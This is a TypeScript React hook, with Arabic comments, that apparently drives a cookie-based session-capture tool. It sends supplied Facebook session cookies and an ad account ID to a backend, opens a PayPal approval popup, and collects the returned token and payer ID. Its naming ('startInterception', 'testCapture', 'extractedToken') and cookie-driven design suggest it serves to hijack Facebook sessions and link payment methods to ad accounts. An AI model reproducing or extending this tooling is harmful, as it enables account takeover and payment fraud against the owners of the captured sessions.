import { useState, useCallback } from 'react';
import {
  initiatePayPalLinking,
  captureSession,
  type CapturedFlags,
  type CaptureReport,
} from './api';

export function useAutomation() {
  const [loading, setLoading] = useState(false);
  const [capturing, setCapturing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const [extractedToken, setExtractedToken] = useState<string | null>(null);
  const [extractedPayerId, setExtractedPayerId] = useState<string | null>(null);
  const [captured, setCaptured] = useState<CapturedFlags | null>(null);
  const [report, setReport] = useState<CaptureReport | null>(null);

  /** اختبار الالتقاط فقط (بدون ربط) */
  const testCapture = useCallback(async (cookies: string) => {
    setCapturing(true);
    setError(null);
    setReport(null);
    try {
      const res = await captureSession(cookies);
      setReport(res);
      setCaptured(res.captured);
    } catch (err: any) {
      setError(err.response?.data?.error || err.message || 'فشل اختبار الالتقاط');
    } finally {
      setCapturing(false);
    }
  }, []);

  const startInterception = useCallback(async (cookies: string, adAccount: string) => {
    setLoading(true);
    setError(null);
    setSuccess(false);
    setExtractedToken(null);
    setExtractedPayerId(null);
    setCaptured(null);

    try {
      // 1. السيرفر يفتح جلسة فيسبوك ويقرأ البارامترات ويرجّع رابط موافقة PayPal
      const result = await initiatePayPalLinking(cookies, adAccount);
      setCaptured(result.captured || null);

      // 2. فتح نافذة الموافقة
      const width = 600;
      const height = 650;
      const left = window.screenX + (window.outerWidth - width) / 2;
      const top = window.screenY + (window.outerHeight - height) / 2;

      const popup = window.open(
        result.approvalUrl,
        'paypal_popup',
        `width=${width},height=${height},left=${left},top=${top},resizable,scrollbars`
      );

      if (!popup) {
        throw new Error('الرجاء السماح بالنوافذ المنبثقة (Pop-ups) في المتصفح');
      }

      // 3. انتظار بيانات الكولباك عبر postMessage
      const messagePromise = new Promise<{ token: string; payerId: string }>((resolve, reject) => {
        const timeoutId = setTimeout(() => {
          window.removeEventListener('message', handler);
          if (!popup.closed) popup.close();
          reject(new Error('انتهى الوقت المسموح (5 دقائق). جرب مرة أخرى.'));
        }, 5 * 60 * 1000);

        function handler(event: MessageEvent) {
          if (event.origin !== window.location.origin) return;
          const data = event.data;
          if (data && data.type === 'PAYPAL_SUCCESS' && data.token && data.payerId) {
            clearTimeout(timeoutId);
            window.removeEventListener('message', handler);
            resolve({ token: data.token, payerId: data.payerId });
          }
        }

        window.addEventListener('message', handler);
      });

      const { token, payerId } = await messagePromise;
      popup.close();

      setExtractedToken(token);
      setExtractedPayerId(payerId);
      setSuccess(true);
    } catch (err: any) {
      const serverMessage = err.response?.data?.error;
      setError(serverMessage || err.message || 'حدث خطأ غير متوقع');
    } finally {
      setLoading(false);
    }
  }, []);

  return {
    startInterception,
    testCapture,
    loading,
    capturing,
    error,
    success,
    extractedToken,
    extractedPayerId,
    captured,
    report,
  };
}
